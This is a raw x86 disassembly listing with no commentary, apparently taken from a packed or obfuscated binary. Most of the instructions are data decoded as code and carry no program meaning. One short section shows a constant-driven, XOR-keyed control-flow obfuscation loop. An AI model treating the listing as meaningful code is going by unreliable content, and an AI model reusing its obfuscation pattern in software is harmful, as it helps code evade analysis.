  40591e:	mov    dl,0x4d
  405920:	push   0xa1149b67
  405925:	jae    0x40595e
  405927:	ret    
  405928:	sar    BYTE PTR [ecx+edi*2+0x72],1
  40592c:	pop    esp
  40592d:	das    
  40592e:	call   0xd3dd:0x87556be7
  405935:	mov    edx,0x2fe4a7d8
  40593a:	pop    ss
  40593b:	lahf   
  40593c:	cmp    eax,0x71e53f21
  405941:	inc    esi
  405942:	xchg   ebx,eax
  405943:	ins    DWORD PTR es:[edi],dx
  405944:	fwait
  405945:	cli    
  405946:	shl    DWORD PTR [ebx+0x358a82f8],0xca
  40594d:	rcr    DWORD PTR [ebx-0x48232701],cl
  405953:	sbb    DWORD PTR [eax-0x4c1e04ae],esi
  405959:	fwait
  40595a:	cld    
  40595b:	data16 in al,dx
  40595d:	inc    esi
  40595e:	stos   BYTE PTR es:[edi],al
  40595f:	mov    esi,0xada57df7
  405964:	dec    edi
  405965:	mov    eax,DWORD PTR ds:0x1b82a321
  40596b:	mov    eax,0x18514660
  405970:	les    edx,FWORD PTR [eax]
  405972:	adc    al,0x63
  405974:	cld    
  405975:	mov    esp,0x2b555fd0
  40597a:	test   al,0xd3
  40597c:	sub    ch,BYTE PTR [ecx+ebp*4]
  40597f:	xor    DWORD PTR ds:0x1810d9f3,esp
  405985:	adc    eax,0x194bde29
  40598a:	imul   ecx,edx,0x3fe8dcc2
  405990:	out    0xe1,eax
  405992:	push   edx
  405993:	test   eax,0x3f8c7e38
  405998:	adc    eax,0x42ebdc72
  40599d:	out    0xdf,al
  40599f:	sbb    eax,0x722b957a
  4059a4:	cdq    
  4059a5:	jg     0x405a15
  4059a7:	retf   
  4059a8:	push   ss
  4059a9:	inc    ebp
  4059aa:	add    DWORD PTR [eax],ebx
  4059ac:	pop    ds
  4059ad:	dec    eax
  4059ae:	enter  0x8577,0xba
  4059b2:	xchg   ebx,eax
  4059b4:	imul   ecx,esi,0xffffffac
  4059b7:	bound  ebx,QWORD PTR [ecx-0x6a8cbe1f]
  4059bd:	jno    0x405946
  4059bf:	sub    bl,dl
  4059c1:	inc    esp
  4059c2:	dec    edx
  4059c3:	(bad)  
  4059c4:	aam    0x7f
  4059c6:	mov    ebx,0xbf68fa67
  4059cb:	jae    0x4059ba
  4059cd:	jl     0x405a0c
  4059cf:	mov    al,ds:0x7356af74
  4059d4:	fsubp  st(1),st
  4059d6:	(bad)  
  4059d8:	out    dx,al
  4059d9:	pop    ss
  4059da:	xor    al,0xc2
  4059dc:	pop    ds
  4059dd:	and    DWORD PTR [eax+0x14393471],edi
  4059e3:	xchg   BYTE PTR [eax+0x53],dh
  4059e6:	mov    al,0x90
  4059e8:	enter  0x33b8,0x8f
  4059ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4059ed:	pop    edx
  4059ee:	int    0x63
  4059f0:	out    0xc9,eax
  4059f2:	jb     0x4059b8
  4059f4:	in     eax,0xdd
  4059f6:	jl     0x405a47
  4059f8:	icebp  
  4059f9:	ja     0x4059ee
  4059fb:	mov    ds:0xa9435d15,al
  405a00:	inc    esp
  405a01:	xor    DWORD PTR [ebx-0x1f],ebp
  405a04:	or     ah,0x5a
  405a07:	or     al,0x96
  405a09:	addps  xmm4,XMMWORD PTR [ecx-0x1b]
  405a0d:	mov    al,0xb5
  405a0f:	faddp  st(6),st
  405a11:	gs hlt 
  405a13:	out    dx,al
  405a14:	sub    ch,ah
  405a16:	jo     0x4059a7
  405a18:	fucomp st(2)
  405a1a:	sbb    BYTE PTR [edx+0x93fa69f],ah
  405a20:	imul   ebx,DWORD PTR [edx+0x2c4a9c17],0xffffffd7
  405a27:	popa   
  405a28:	aaa    
  405a29:	mov    bl,0xce
  405a2b:	dec    edi
  405a2c:	jmp    0x405a47
  405a2e:	in     eax,dx
  405a2f:	mov    BYTE PTR [edx+0x7d],al
  405a32:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405a33:	aam    0x3c
  405a35:	mov    bh,0x70
  405a37:	cmp    dl,bl
  405a39:	mov    esi,edx
  405a3b:	stos   DWORD PTR es:[edi],eax
  405a3c:	sar    DWORD PTR [edi],0xa4
  405a3f:	out    dx,eax
  405a40:	sub    ch,ah
  405a42:	mov    ds:0xb0d74b6c,al
  405a47:	xlat   BYTE PTR ds:[ebx]
  405a48:	pop    ds
  405a49:	imul   ebp,ebx,0x62
  405a4c:	push   esp
  405a4d:	inc    esi
  405a4e:	and    cl,bh
  405a50:	jg     0x405a6f
  405a52:	xor    eax,0x30b2320
  405a57:	inc    edx
  405a58:	jl     0x405a34
  405a5a:	jl     0x405abe
  405a5c:	lds    esp,FWORD PTR [edi]
  405a5e:	cmp    BYTE PTR [ebx-0x1e],bh
  405a61:	popf   
  405a62:	sub    al,0xae
  405a64:	test   ebp,ebp
  405a66:	gs retf 0x7dd7
  405a6a:	jmp    0x405a45
  405a6c:	cmp    DWORD PTR [edi],edi
  405a6e:	sub    al,0x1a
  405a70:	test   DWORD PTR [esi],ebp
  405a72:	jne    0x405a96
  405a74:	mov    dh,0xec
  405a76:	(bad)  
  405a77:	es cmp edx,ebx
  405a7a:	shr    BYTE PTR [ebx+0x75c40972],cl
  405a80:	push   0xf0bec2a6
  405a85:	dec    ebx
  405a86:	mov    ds:0xf382bb24,eax
  405a8b:	ret    0xc57a
  405a8e:	(bad)  
  405a8f:	lahf   
  405a90:	push   ds
  405a91:	int    0xc6
  405a93:	dec    esi
  405a94:	inc    ebp
  405a95:	fistp  DWORD PTR [edi-0x20]
  405a98:	loop   0x405ada
  405a9a:	xchg   esp,eax
  405a9b:	adc    al,0xb9
  405a9d:	dec    edi
  405a9e:	sbb    DWORD PTR [ebp+0x52b0db70],eax
  405aa4:	and    dh,bl
  405aa6:	clc    
  405aa7:	ficomp WORD PTR [esi-0x46]
  405aaa:	and    DWORD PTR [ebp-0x71f69332],ebp
  405ab0:	nop
  405ab1:	jbe    0x405af1
  405ab3:	sbb    DWORD PTR [edi-0x50],edi
  405ab6:	lods   al,BYTE PTR ds:[esi]
  405ab7:	div    BYTE PTR [esi-0x32]
  405aba:	ficom  WORD PTR [ebp-0x3a81b50d]
  405ac0:	pop    eax
  405ac1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405ac2:	cmp    dl,BYTE PTR [esi+0x52]
  405ac5:	in     al,dx
  405ac6:	sub    al,0x87
  405ac8:	outs   dx,DWORD PTR ds:[esi]
  405ac9:	loope  0x405b47
  405acb:	inc    eax
  405acc:	or     eax,0xd803dfd4
  405ad1:	(bad)  
  405ad3:	popf   
  405ad4:	aas    
  405ad5:	jg     0x405af3
  405ad7:	int3   
  405ad8:	xor    DWORD PTR ds:0xc7a6e844,esi
  405ade:	adc    eax,0x90301670
  405ae3:	or     al,0xda
  405ae5:	sbb    esp,ecx
  405ae7:	push   edi
  405ae8:	call   0xf5b8:0x524cd32f
  405aef:	mov    al,ds:0xfd60e22e
  405af4:	dec    edi
  405af5:	rcr    BYTE PTR [eax-0xe7ee6e7],cl
  405afb:	call   0x9fbf:0x942e4214
  405b02:	nop
  405b03:	stos   DWORD PTR es:[edi],eax
  405b04:	mov    es,WORD PTR [ebx+0x63f753b3]
  405b0a:	jge    0x405b2b
  405b0c:	push   cs
  405b0d:	jge    0x405af3
  405b0f:	dec    edx
  405b10:	mov    dl,0xae
  405b12:	mov    eax,ds:0x350fe595
  405b17:	mov    bh,0x50
  405b19:	pop    edi
  405b1a:	push   ecx
  405b1b:	js     0x405aac
  405b1d:	or     al,0x3a
  405b1f:	xchg   esi,eax
  405b20:	aad    0x36
  405b22:	into   
  405b23:	lahf   
  405b24:	pop    ecx
  405b25:	into   
  405b26:	imul   BYTE PTR [ebx+eax*1]
  405b29:	test   DWORD PTR [ecx+0x7],0x86418c59
  405b30:	jno    0x405ace
  405b32:	mov    DWORD PTR [ebp+0x10],ecx
  405b35:	mov    ecx,0xc6d
  405b3a:	mov    DWORD PTR [ebp+0x8],0xf34cebd
  405b41:	mov    DWORD PTR [ebp-0x4],0xf89c853e
  405b48:	mov    ecx,0xf89c8532
  405b4d:	push   esi
  405b4e:	mov    esi,DWORD PTR ds:0x43371b
  405b54:	mov    DWORD PTR [ebp+0x10],0x70019f3
  405b5b:	mov    esi,DWORD PTR [ebp-0x4]
  405b5e:	cmp    ecx,esi
  405b60:	je     0x405b9b
  405b66:	mov    esi,DWORD PTR [ebp+0xc]
  405b69:	xor    ecx,eax
  405b6b:	xor    DWORD PTR ds:0x4336d3,0x55d1
  405b75:	xor    esi,eax
  405b77:	lea    ecx,[esi+ecx*1+0x32729b]
  405b7e:	xor    ecx,eax
  405b80:	cmp    ecx,0xf89c8521
  405b86:	jne    0x405b4e
  405b8c:	mov    DWORD PTR ds:0x433723,0x74e6
  405b96:	jmp    0x4062dd
  405b9b:	add    ecx,0xffcd8d65
  405ba1:	mov    esi,ecx
  405ba3:	xor    esi,eax
  405ba5:	add    esi,DWORD PTR [ebp+0x8]
  405ba8:	mov    DWORD PTR ds:0x43376f,0x6ead
  405bb2:	mov    DWORD PTR [ebp+0x8],esi
  405bb5:	mov    esi,DWORD PTR [ebp+0x8]
  405bb8:	mov    DWORD PTR ds:0x4337af,0x3a4c
  405bc2:	jmp    0x405f11
  405bc7:	jmp    0x4f7a1a24
  405bcc:	fldcw  WORD PTR [ecx+0x68]
  405bcf:	les    esi,FWORD PTR [esi-0x41]
  405bd2:	adc    eax,0x310acadb
  405bd7:	call   0x2cbeda11
  405bdc:	jge    0x405c5c
  405bde:	jle    0x405b86
  405be0:	sbb    ah,BYTE PTR [ebx]
  405be2:	mov    ebp,0x8b7408c5
  405be7:	dec    ebx
  405be8:	js     0x405c10
  405bea:	push   es
  405beb:	aad    0x8a
  405bed:	dec    edx
  405bee:	fst    DWORD PTR [esi-0x5f]
  405bf1:	mov    eax,0xd0d2e611
  405bf6:	mov    ah,0xe4
  405bf8:	stos   BYTE PTR es:[edi],al
  405bf9:	mov    eax,0xfbafd2b2
  405bfe:	sbb    al,bl
  405c00:	adc    edx,DWORD PTR [ecx+0x3]
  405c03:	mov    edx,0xd89104f9
  405c08:	aas    
  405c09:	push   ss
  405c0a:	xor    eax,0x605c074a
  405c0f:	mov    ds:0x4de19117,al
  405c14:	xchg   DWORD PTR [eax+0x1],ebx
  405c17:	sbb    DWORD PTR [edx+0x729003cb],ecx
  405c1d:	dec    esi
  405c1e:	mov    esi,DWORD PTR [ebp-0x60]
  405c21:	dec    ebx
  405c22:	out    dx,al
  405c23:	out    dx,al
  405c24:	shl    DWORD PTR [esp+ebp*8+0x3f],1
  405c28:	inc    ebp
  405c29:	add    esi,edi
  405c2b:	fwait
  405c2c:	jne    0x405c8d
  405c2e:	test   eax,0x9c002fa9
  405c33:	xor    eax,0xe61e6598
  405c38:	(bad)  
  405c39:	stos   BYTE PTR es:[edi],al
  405c3a:	fdivr  DWORD PTR [ebx]
  405c3c:	jb     0x405bcc
  405c3e:	mov    esp,ecx
  405c40:	test   DWORD PTR [ebx-0x40],edi
  405c43:	jae    0x405bed
  405c45:	(bad)  
  405c46:	dec    edi
  405c47:	pop    esp
  405c48:	sti    
  405c49:	into   
  405c4a:	mov    al,ds:0xe576b6aa
  405c4f:	bound  ebp,QWORD PTR [esi+ebx*4-0x3e]
  405c53:	mov    al,0x95
  405c55:	mov    cl,0xe
  405c57:	mov    eax,gs
  405c59:	lock sub al,0xff
  405c5c:	stos   BYTE PTR es:[edi],al
  405c5d:	xchg   edx,eax
  405c5e:	push   cs
  405c5f:	mov    cl,0xe0
  405c61:	mov    dl,BYTE PTR [ecx]
  405c63:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405c64:	das    
  405c65:	xchg   ecx,eax
  405c66:	jl     0x405cc1
  405c68:	mov    ds:0x9d259ef3,al
  405c6d:	stc    
  405c6e:	scas   eax,DWORD PTR es:[edi]
  405c6f:	jo     0x405c4a
  405c71:	inc    eax
  405c72:	or     al,0x64
  405c74:	fs in  eax,dx
  405c76:	fldenv [ebx+0x75a0d59f]
  405c7c:	adc    esp,DWORD PTR [ecx-0x33c953b8]
  405c82:	inc    ecx
  405c83:	mov    esi,0x7c673427
  405c88:	es inc ebp
  405c8a:	or     DWORD PTR [eax+0x24],edi
  405c8d:	test   BYTE PTR [esi-0x61],bl
  405c90:	adc    ah,ch
  405c92:	and    dh,BYTE PTR [ecx]
  405c94:	push   esi
  405c95:	sub    eax,0xcf91617c
  405c9a:	jnp    0x405c47
  405c9c:	pop    es
  405c9d:	int    0x81
  405c9f:	push   ss
  405ca0:	inc    edi
  405ca1:	mov    ds:0x7245470a,eax
  405ca6:	dec    esp
  405ca7:	pusha  
  405ca8:	sbb    ch,BYTE PTR [ecx]
  405caa:	imul   ebp,DWORD PTR [edi-0x15],0x3379c01a
  405cb1:	push   esi
  405cb2:	add    eax,DWORD PTR [eax-0x10]
  405cb5:	loope  0x405c5e
  405cb7:	loope  0x405c75
  405cb9:	ins    BYTE PTR es:[edi],dx
  405cba:	test   eax,0xd2219123
  405cbf:	std    
  405cc0:	stos   BYTE PTR es:[edi],al
  405cc1:	daa    
  405cc2:	mov    al,ds:0x44237bd6
  405cc7:	or     bh,ch
  405cc9:	aaa    
  405cca:	pushf  
  405ccb:	repnz (bad) 
  405cce:	xchg   esp,eax
  405ccf:	xor    DWORD PTR [esi],0xffffffc4
  405cd2:	dec    edx
  405cd3:	push   esp
  405cd4:	mov    ds:0x20b0f16d,al
  405cd9:	fild   WORD PTR [ebx-0x51924abc]
  405cdf:	add    al,0x9
  405ce1:	clc    
  405ce2:	shl    eax,cl
  405ce4:	test   eax,0x4595a039
  405ce9:	fdivr  DWORD PTR [ecx]
  405ceb:	add    eax,0xacc1d25d
  405cf0:	adc    ecx,DWORD PTR [ecx+ebp*2-0x15]
  405cf4:	sub    eax,0x18f7f82e
  405cf9:	jge    0x405d67
  405cfb:	sbb    eax,DWORD PTR [edx]
  405cfd:	leave  
  405cfe:	ficom  DWORD PTR [edi+0x7a2e37b4]
  405d04:	int3   
  405d05:	ror    DWORD PTR [eax],1
  405d07:	sbb    esp,DWORD PTR [esi-0x5a]
  405d0a:	fstp   QWORD PTR [eax+0x75cc9b25]
  405d10:	aas    
  405d11:	loopne 0x405caa
  405d13:	inc    esi
  405d14:	xchg   BYTE PTR fs:[ecx+eiz*4-0x36ed014],al
  405d1c:	loop   0x405cec
  405d1e:	xlat   BYTE PTR ds:[ebx]
  405d1f:	jge    0x405cda
  405d21:	not    BYTE PTR [ecx-0x2a]
  405d24:	popa   
  405d25:	mov    al,ds:0xa011aa5
  405d2a:	lods   eax,DWORD PTR ds:[esi]
  405d2b:	rcl    DWORD PTR [ecx],0x9d
  405d2e:	cli    
  405d2f:	sub    eax,0x4251459c
  405d34:	sbb    dh,bh
  405d36:	adc    cl,bh
  405d38:	call   0x15cb:0xf37fd95b
  405d3f:	sub    al,0x26
  405d41:	mov    edi,0x9202fa22
  405d46:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405d47:	prefetch BYTE PTR [edx]
  405d4a:	ret    
  405d4b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405d4c:	push   es
  405d4d:	jl     0x405d6b
  405d4f:	fild   DWORD PTR [ecx+eiz*1]
  405d52:	adc    edi,edx
  405d54:	mov    edi,0x542acaf9
  405d59:	or     BYTE PTR [eax+0x73],dl
  405d5c:	adc    eax,0x846f747f
  405d61:	xchg   ebp,eax
  405d62:	dec    ebx
  405d63:	sub    BYTE PTR ds:0xfb1f0637,cl
  405d69:	jge    0x405de4
  405d6b:	pop    edx
  405d6c:	sbb    dh,BYTE PTR [ebp+0x3160ec84]
  405d72:	sub    al,0xc8
  405d74:	xchg   ebx,eax
  405d75:	inc    ebp
  405d76:	call   0x6d8d:0x46910fe4
  405d7d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405d7e:	fs jne 0x405dbd
  405d81:	push   0xadecec14
  405d86:	mov    esi,0x46e84ac9
  405d8b:	xchg   BYTE PTR [ebp-0x6c4715ae],cl
  405d91:	fdivr  DWORD PTR [ebx+eax*2+0x2b]
  405d95:	inc    edi
  405d96:	fild   QWORD PTR [ecx]
  405d98:	pop    ebx
  405d99:	pop    ebx
  405d9a:	xor    DWORD PTR [eax],esi
  405d9c:	xchg   ebp,eax
  405d9d:	test   DWORD PTR [esi],ebp
  405d9f:	mov    BYTE PTR [edi],ch
  405da1:	ds leave 
  405da3:	daa    
  405da4:	cmp    BYTE PTR [ebx-0x29],bl
  405da7:	(bad)  
  405da8:	adc    eax,0xb3b90ec5
  405dad:	(bad)
  405db2:	bound  edx,QWORD PTR [ebx+0x54835e9c]
  405db8:	lods   al,BYTE PTR ds:[esi]
  405db9:	pop    eax
  405dba:	gs dec ebx
  405dbc:	sub    esp,ebx
  405dbe:	jmp    0x405e33
  405dc0:	mov    bh,0x69
  405dc2:	stos   DWORD PTR es:[edi],eax
  405dc3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405dc4:	out    dx,eax
  405dc5:	xchg   ecx,eax
  405dc6:	stos   BYTE PTR es:[edi],al
  405dc7:	jg     0x405e0f
  405dc9:	jmp    0x42d1:0x7fc8b441
  405dd0:	outs   dx,DWORD PTR ds:[esi]
  405dd1:	adc    al,0x8
  405dd3:	aad    0x92
  405dd5:	into   
  405dd6:	loope  0x405d5a
  405dd8:	jmp    0x653f:0x2e2ac63c
  405ddf:	inc    edi
  405de0:	sub    al,0x4e
  405de2:	gs pop ebx
  405de4:	mov    edi,0xe3d4a62f
  405de9:	mov    dh,BYTE PTR [ebx]
  405deb:	inc    DWORD PTR [edx]
  405ded:	mov    ah,0xa4
  405def:	or     al,0x26
  405df1:	daa    
  405df2:	xlat   BYTE PTR ds:[ebx]
  405df3:	push   0x36
  405df5:	cmp    eax,0x72942c2b
  405dfa:	and    esi,ecx
  405dfc:	mov    cl,0x64
  405dfe:	(bad)  
  405dff:	mov    ch,0xb3
  405e01:	and    eax,0xb2eb339b
  405e06:	xchg   edi,eax
  405e07:	mov    ebx,0x284049de
  405e0c:	and    DWORD PTR [ecx],0x77
  405e0f:	daa    
  405e10:	xchg   ecx,eax
  405e11:	je     0x405e1e
  405e13:	cli    
  405e14:	cwde   
  405e15:	sahf   
  405e16:	call   edx
  405e18:	add    DWORD PTR [esi-0xc],edx
  405e1b:	(bad)  
  405e1c:	adc    eax,0x292f992a
  405e21:	jne    0x405dee
  405e23:	(bad)  
  405e25:	addr16 and eax,0x3f63708
  405e2b:	retf   0xe177
  405e2e:	ret    0x254d
  405e31:	xor    dl,BYTE PTR [eax]
  405e33:	cwde   
  405e34:	mov    ecx,ebp
  405e36:	sbb    dh,dl
  405e38:	mov    eax,db7
  405e3b:	ds retf 0xe392
  405e3f:	call   0x8787:0xdca99cd1
  405e46:	mov    eax,ds:0x5d61ddb9
  405e4b:	in     al,dx
  405e4c:	sub    BYTE PTR [ebp+0x3b8eed0d],0x90
  405e53:	add    BYTE PTR [edx+0x56b45fd4],cl
  405e59:	fwait
  405e5a:	(bad)  
  405e5b:	into   
  405e5c:	mov    ds:0x378efc29,al
  405e61:	fist   DWORD PTR [esi]
  405e63:	mov    dl,0x97
  405e65:	lfs    eax,FWORD PTR [ecx]
  405e68:	xlat   BYTE PTR ds:[ebx]
  405e69:	xor    al,0xf5
  405e6b:	or     esi,DWORD PTR [eax+0x41356924]
  405e71:	dec    ebx
  405e72:	and    eax,0x8f184425
  405e77:	repz loope 0x405e26
  405e7a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405e7b:	aad    0x1
  405e7d:	mov    edx,0x4f8b44b5
  405e82:	sbb    al,0x55
  405e84:	jae    0x405e67
  405e86:	mov    ebp,0xbedbf208
  405e8b:	nop
  405e8c:	sbb    DWORD PTR [ecx+0x72],edx
  405e8f:	out    0x9f,eax
  405e91:	enter  0x1926,0x3c
  405e95:	lock inc eax
  405e97:	imul   ebp,DWORD PTR [ecx-0x2ba3e18d],0x4c8f2fe
  405ea1:	stc    
  405ea2:	mov    ah,0x1c
  405ea4:	pop    ss
  405ea5:	push   esi
  405ea6:	adc    BYTE PTR [edi-0x26],al
  405ea9:	idiv   ebx
  405eab:	rcr    DWORD PTR [esi+eiz*8],0x1d
  405eaf:	hlt    
  405eb0:	das    
  405eb1:	test   al,0xb
  405eb3:	inc    edi
  405eb4:	fmul   DWORD PTR [ebp-0x5d1c2c88]
  405eba:	or     cl,BYTE PTR [edi-0x69bc7b27]
  405ec0:	pushf  
  405ec1:	pop    ebx
  405ec2:	dec    edi
  405ec3:	cmp    ah,BYTE PTR ds:0x1ff3a93a
  405ec9:	mov    bh,0xdd
  405ecb:	xchg   DWORD PTR [ebx+0x1eb68f7c],eax
  405ed1:	fwait
  405ed2:	(bad)  
  405ed3:	clc    
  405ed4:	cs std 
  405ed6:	or     edi,DWORD PTR [ebp-0x705bb406]
  405edc:	and    DWORD PTR [edi-0x5a],ebx
  405edf:	lods   eax,DWORD PTR ds:[esi]
  405ee0:	xchg   ecx,eax
  405ee1:	popf   
  405ee2:	mov    ebp,0x5296a48
  405ee7:	out    dx,al
  405ee8:	stos   BYTE PTR es:[edi],al
  405ee9:	ret    
  405eea:	fild   QWORD PTR [ebp+0x1c]
  405eed:	lahf   
  405eee:	mov    eax,0xdfdd78b
  405ef3:	and    ah,0xb0
  405ef6:	and    BYTE PTR [edi],0x9c
  405ef9:	dec    edi
  405efa:	push   eax
  405efb:	inc    esp
  405efc:	out    0xe1,eax
  405efe:	dec    esp
  405eff:	sbb    edi,DWORD PTR [ebp-0x202da0a5]
  405f05:	jb     0x405ecb
  405f07:	cmp    dl,bh
  405f09:	fadd   st,st(5)
  405f0b:	out    0xfd,eax
  405f0d:	int    0xcb
  405f0f:	cdq    
  405f10:	adc    dh,BYTE PTR [ebx]
  405f12:	icebp  
  405f13:	neg    ecx
  405f15:	jmp    0x406264
  405f1a:	jne    0x405eee
  405f1c:	sub    al,0xaa
  405f1e:	test   eax,0x31d17170
  405f23:	test   eax,edx
  405f25:	mov    WORD PTR [edx+0x7e],ss
  405f28:	mov    esp,0x7e30a69d
  405f2d:	jle    0x405f5b
  405f2f:	jge    0x405faf
  405f31:	jle    0x405ec3
  405f33:	rol    BYTE PTR [ebx-0x24352a0c],cl
  405f39:	cmp    BYTE PTR [edx],al
  405f3b:	add    al,0xf8
  405f3d:	enter  0x9ee8,0x37
  405f41:	cdq    
  405f42:	adc    eax,0xf55ae430
  405f47:	addr16 hlt 
  405f49:	lds    eax,FWORD PTR [edi*2+0x50c18958]
  405f50:	mov    ebp,0x3f5e7e26
  405f55:	xchg   edx,eax
  405f56:	and    eax,0xdb19dbdc
  405f5b:	sbb    esi,eax
  405f5d:	out    dx,al
  405f5e:	into   
  405f5f:	or     bp,WORD PTR [edx+0x63c3777d]
  405f66:	sub    dh,BYTE PTR [edx]
  405f68:	imul   ebp,ebx,0x50c753a8
  405f6e:	sbb    DWORD PTR [ebx],esi
  405f70:	lahf   
  405f71:	lahf   
  405f72:	sbb    al,0x97
  405f74:	std    
  405f75:	cs jo  0x405fef
  405f78:	xor    BYTE PTR [ebx+0x31277095],0x95
  405f7f:	adc    al,0xb7
  405f82:	stos   DWORD PTR es:[di],eax
  405f84:	cs popf 
  405f86:	pop    ss
  405f87:	test   BYTE PTR [edx+0x3ac63035],cl
  405f8d:	sub    esp,ebx
  405f8f:	leave  
  405f90:	xchg   esi,eax
  405f91:	add    BYTE PTR [ebx+0x3394be9b],dh
  405f97:	push   ebp
  405f98:	push   ecx
  405f99:	sub    bh,BYTE PTR ds:0xcd8fa92b
  405fa0:	ret    
  405fa1:	jo     0x405fa3
  405fa3:	in     eax,dx
  405fa4:	loope  0x405fa6
  405fa6:	pop    ebp
  405fa7:	into   
  405fa8:	cmp    eax,0x62c186ae
  405fad:	in     eax,0x3e
  405faf:	xchg   ebp,eax
  405fb0:	fist   WORD PTR [edi]
  405fb2:	xor    esi,DWORD PTR [esp+ecx*4-0x49]
  405fb6:	mov    ch,0xa8
  405fb8:	shr    DWORD PTR [ebx-0x1a],0x96
  405fbc:	cwde   
  405fbd:	mov    esp,DWORD PTR [ebx+eiz*2]
  405fc0:	sub    al,0x99
  405fc2:	mov    al,ds:0x5f37d7a2
  405fc7:	outs   dx,BYTE PTR ds:[esi]
  405fc8:	cli    
  405fc9:	sub    edx,DWORD PTR [edx]
  405fcb:	in     eax,dx
  405fcc:	(bad)  [ecx]
  405fce:	sbb    DWORD PTR ds:[ebx-0x73],edx
  405fd2:	retf   0x7b
  405fd5:	jo     0x405fc5
  405fd7:	inc    edx
  405fd8:	fidivr DWORD PTR [edi+0x76]
  405fdb:	add    BYTE PTR [ecx-0x68],dl
  405fde:	sbb    cl,BYTE PTR [edi-0x6b370882]
  405fe4:	call   FWORD PTR [eax+ebp*1+0x7a039453]
  405feb:	jb     0x405fa4
  405fed:	scas   eax,DWORD PTR es:[edi]
  405fee:	dec    ecx
  405fef:	pop    esi
  405ff0:	test   al,0x28
  405ff2:	sar    DWORD PTR [ecx+ebp*4],0x6f
  405ff6:	int    0xf
  405ff8:	test   ch,ch
  405ffa:	sahf   
  405ffb:	mov    BYTE PTR [ebp+0x1f97773],0xee
  406002:	sub    al,BYTE PTR [edi]
  406004:	sbb    BYTE PTR [ecx-0xcef8f82],dl
  40600a:	shl    BYTE PTR [ebx+0x68],1
  40600d:	shr    DWORD PTR [ebp+0xbf7791c],0x8f
  406014:	(bad)  
  406015:	cmp    eax,0xcabb7915
  40601a:	sub    bl,BYTE PTR [eax+0x1f]
  40601d:	mov    dh,0x67
  40601f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406020:	ror    BYTE PTR [eax-0x5c705433],1
  406026:	mov    ds:0x71bba72e,al
  40602b:	pusha  
  40602c:	adc    dh,BYTE PTR [ebp-0x309bceef]
  406032:	call   0xf92:0xb9dff984
  406039:	push   es
  40603a:	dec    ebp
  40603b:	cmp    BYTE PTR [edi],bh
  40603d:	cmp    ebx,DWORD PTR [esi]
  40603f:	cld    
  406040:	fild   DWORD PTR [edx+0x5853a9cc]
  406047:	icebp  
  406048:	mov    dl,0x87
  40604a:	retf   
  40604b:	mov    WORD PTR [esi],es
  40604d:	dec    eax
  40604e:	and    eax,0xb7d667c1
  406053:	push   0xffffffdd
  406055:	jl     0x405fde
  406057:	and    edx,DWORD PTR [ebx]
  406059:	xor    al,0x39
  40605b:	js     0x406004
  40605d:	xor    ah,BYTE PTR [edx+0x4c466bb8]
  406063:	into   
  406064:	or     bl,bl
  406066:	xchg   esi,eax
  406067:	das    
  406068:	test   eax,0xa421c693
  40606d:	mov    ds:0xe803d670,eax
  406072:	add    al,0x95
  406074:	sbb    eax,0xfefdc6ed
  406079:	mov    ecx,edx
  40607b:	test   eax,0x83c6caaf
  406080:	repz push esi
  406082:	outs   dx,BYTE PTR ds:[esi]
  406083:	stos   BYTE PTR es:[edi],al
  406084:	sbb    ch,BYTE PTR [edx+eiz*1+0x1777cec9]
  40608b:	test   al,0x89
  40608d:	adc    ch,BYTE PTR [edx+0x63]
  406090:	aad    0x13
  406092:	sti    
  406093:	out    0x76,eax
  406095:	sbb    eax,0x1371c81d
  40609a:	out    0xb5,eax
  40609c:	xor    esi,edi
  40609e:	out    0x7c,eax
  4060a0:	out    dx,eax
  4060a1:	bound  ecx,QWORD PTR [edx-0x14]
  4060a4:	push   eax
  4060a5:	fstp   TBYTE PTR [esi+edi*8]
  4060a8:	gs dec ecx
  4060ab:	stos   BYTE PTR es:[edi],al
  4060ac:	pop    esi
  4060ad:	mov    ecx,0x8cdb2c03
  4060b2:	cmc    
  4060b3:	ins    BYTE PTR es:[edi],dx
  4060b4:	in     al,0xce
  4060b6:	fbstp  TBYTE PTR [edx-0x6695749b]
  4060bc:	and    BYTE PTR [edi+0xb],0xe7
  4060c0:	out    dx,eax
  4060c1:	mov    al,0x40
  4060c3:	sub    eax,esi
  4060c5:	and    al,BYTE PTR [edi-0x12]
  4060c8:	loop   0x406130
  4060ca:	cs pop es
  4060cc:	or     al,BYTE PTR [eax-0x9040fb7]
  4060d2:	dec    ecx
  4060d3:	call   0xc0f629b2
  4060d8:	mov    dh,0x11
  4060da:	dec    esi
  4060db:	stos   BYTE PTR es:[edi],al
  4060dc:	xchg   esi,eax
  4060dd:	enter  0x34a3,0xe9
  4060e1:	mov    eax,ds:0x4a789d1b
  4060e6:	xchg   ebp,eax
  4060e7:	pusha  
  4060e8:	gs mov esp,0x1c6af043
  4060ee:	jmp    0x406106
  4060f0:	jmp    0x611b:0x69a12105
  4060f7:	lahf   
  4060f8:	mov    bl,bh
  4060fa:	adc    BYTE PTR [ebx+0x2e],bl
  4060fd:	ins    DWORD PTR es:[edi],dx
  4060fe:	call   0x46bbb9a1
  406103:	mov    dl,0x87
  406105:	mov    dl,0x41
  406107:	leave  
  406108:	add    al,0x31
  40610a:	call   0x924d2034
  40610f:	out    dx,al
  406110:	mov    al,ds:0xb2e87a71
  406115:	fs fcmovnu st,st(4)
  406118:	and    BYTE PTR [edx+0x29],cl
  40611b:	stos   BYTE PTR es:[edi],al
  40611c:	adc    eax,0x23ad0e33
  406121:	out    dx,al
  406122:	adc    al,0xaf
  406124:	fs iret 
  406126:	jge    0x4060d8
  406128:	xchg   ebx,eax
  406129:	dec    eax
  40612a:	arpl   bx,sp
  40612c:	mov    edx,0xec606e35
  406131:	xchg   edi,eax
  406132:	arpl   dx,cx
  406134:	mov    ebp,0xf4da91d4
  406139:	adc    eax,0x8d584c05
  40613e:	fisttp DWORD PTR [ecx-0x2d86750e]
  406144:	arpl   WORD PTR [esi-0x48596221],bp
  40614a:	mov    dl,0x1f
